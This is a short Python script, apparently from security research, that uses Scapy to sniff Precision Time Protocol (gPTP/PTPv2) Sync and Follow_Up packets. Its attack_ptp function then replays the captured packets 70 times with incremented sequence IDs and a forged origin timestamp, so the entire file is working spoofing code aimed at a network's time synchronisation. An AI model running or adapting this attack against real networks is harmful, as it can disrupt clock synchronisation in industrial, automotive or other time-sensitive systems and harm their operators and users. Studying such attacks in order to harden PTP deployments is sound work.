from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import UDP, IP
from gptp.layers import PTPv2
from gptp.fields import TimestampField
import time

follow_up_packet = None
sync_packet = None
sequence_id = None

# test
def packet_callback(packet):
    global sync_packet
    global follow_up_packet
    global sequence_id

    if packet.haslayer('PTPv2'):
        ptp_packet = packet[PTPv2]
        if ptp_packet.is_followup and follow_up_packet is None and ptp_packet.reserved1 != 2:
            follow_up_packet = packet
            follow_up_packet[PTPv2].reserved1 = 2
            print("found follow_up")
            print(packet.show())
        if ptp_packet.is_sync and sync_packet is None and ptp_packet.reserved1 != 2:
            sync_packet = packet
            sync_packet[PTPv2].reserved1 = 2
            sequence_id = ptp_packet.sequenceId
            print("found sync")
            print(time.time_ns()/(10**9))
            print(packet.show())

def attack_ptp():
    global sync_packet
    global follow_up_packet
    global sequence_id

    for i in range(70):
        sequence_id+=1
        sync_packet[PTPv2].sequenceId = sequence_id
        follow_up_packet[PTPv2].sequenceId = sequence_id
        del(sync_packet.getlayer(IP).chksum) 
        del(sync_packet.getlayer(UDP).chksum)
        follow_up_packet[PTPv2].preciseOriginTimestamp = time.time_ns() / (10**9)
        sendp(sync_packet)
        del(follow_up_packet.getlayer(IP).chksum) 
        del(follow_up_packet.getlayer(UDP).chksum) 
        sendp(follow_up_packet)
        
        time.sleep(0.9)


while sync_packet is None or follow_up_packet is None:
    sniff(prn=packet_callback, count=5)


print("finished sniff")
print(sequence_id)

attack_ptp()
